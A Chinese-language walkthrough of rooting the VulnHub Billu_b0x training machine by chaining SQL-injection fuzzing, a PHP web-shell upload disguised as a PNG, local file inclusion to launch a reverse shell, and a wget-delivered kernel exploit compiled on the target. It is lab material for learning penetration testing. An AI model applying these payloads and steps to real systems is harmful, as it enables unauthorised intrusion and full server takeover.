vulnhub-Billu_b0x靶机渗透过程

靶机地址：https://download.vulnhub.com/billu/Billu_b0x.zip

打靶目标：获得 root 权限

网络配置：kali和靶机均使用的vmware，nat网络连接（均使用vmnet8），开启了dhcp服务。

kali IP :192.168.26.20

首先nmap扫一下靶机的ip，发现靶机80端口开放了http服务，尝试进行访问

访问80端口我们发现这是一个登录框，并且页面提示了我们，汉语意思是，展示你的SQL注入的能力，说明这里是存在sql注入的，

然后我手工测试了很久，没测出来sql注入，又尝试使用sqlmap进行sql注入，也失败了，然后开始尝试使用burp的爆破功能，看能否有所发现。

第一个位置用的是seclists这个字典项目里面的Generic-SQLi.txt seclists是一个很好用的字典项目，项目链接：https://github.com/danielmiessler/SecLists

第二个位置使用的是burp自带的FUzzing - SQL-injection的字典

然后爆破完成后我们发现有几个返回包的长度与其他的不同，说明可能是有不同的回显，所以我开始使用这些payload尝试登录，发现可以成功登录


如下图所示，在add user 功能下发现可以上传文件，所以尝试进行文件上传

我首先尝试了上传php一句话，发现提示

<?php @eval($_POST['hacker']); ?>


发现只允许上传 png，jpg，gif格式的文件，然后我开始想是否可以通过抓包修改一些参数来绕过，尝试修改了文件头，content-type类型，发现都不行，只能把文件后缀修改成png，gif，jpg之类的才能上传

文件上传到这里我们只是上传了一个内容为php的png文件，得配合解析漏洞或者说文件包含漏洞才能执行我们的shell，回到show users模块点continue后发现多了一行，就是我们刚刚添加的那个用户，由于我们传的不是一张图片所以页面没有成功解析，不过我们可以通过这个链接来确定我们所传文件的名字还有路径。

我们把鼠标放到图片的位置右键点复制图片链接，就获取到了我们所传文件的路径，我们发现服务器并没有更改我们所传文件的名字。

http://192.168.26.128/uploaded_images/shell.png


到这里文件上传的利用也算是陷入了僵局，我又去扫描了靶机的目录

feroxbuster --url http://192.168.26.128/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt


这里用的字典还是seclists项目里面的一个字典

/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt


如下图所示，当访问到add这个页面时，看到了一个和之前在后台看到的页面相同的传文件的结构，很可能是后台的那个文件调用加载了add这个文件，所以我怀疑可能存在本地文件包含的漏洞。

然后我们重新访问登录后的那个页面，burp抓个包看看

如上图所示，我们发现load参数的是add，所以这里我猜测就是通过这个参数调用的add那个文件，所以我尝试修改这个值

我们发现修改完load的值后，页面无法正常加载文件上传的模块，所以的确是加载了add这个文件，所以我们尝试修改load参数传的值，从而让它去加载我们上传的shell.png这个文件，进而执行里面的php代码，这样的话getshell的思路就有了，我们重新上传一个png后缀的文件，里面是反弹shell的代码，当我们去加载这个文件的时候就可以getshell了，我这里用的是kali自带的，记得上传的时候改后缀

修改端口和ip地址，然后在kali 上监听4444端口，然后上传这个反弹shell的文件

然后再通过我们前面发现的文件包含漏洞来加载我们的这个文件，从而执行我们反弹shell的php代码

发送数据包后，如下图所示，我们可以看到成功getshell

通过查询系统内核版本，我们发现该内核版本十分熟悉，是一个存在内核提权的版本，如下图所示

python -c 'import pty;pty.spawn("/bin/bash")'      #使用python获取一个交互式shell
cp /usr/share/exploitdb/exploits/linux/local/372292.c  /root/exp.c
cd  /root
python3 -m http.server 80                             #kali开启临时http服务

wget http://192.168.26.20/exp.c                       #在靶机上讲exp.c下载到本地
chmod +x exp.c
gcc exp.c -o exp
./exp


总结：这台靶机的渗透过程到这里也就结束了，在这台靶机渗透过程中，使用了burp fuzz到了sql注入的payload，之后又利用发现的文件上传和文件包含漏洞成功getshell，突破边界后用到了一个内核提权，成功获取到了root权限，总的来说这台靶机考察的漏洞类型都是常规的漏洞类型，总体来说算是一个比较简单的靶机。
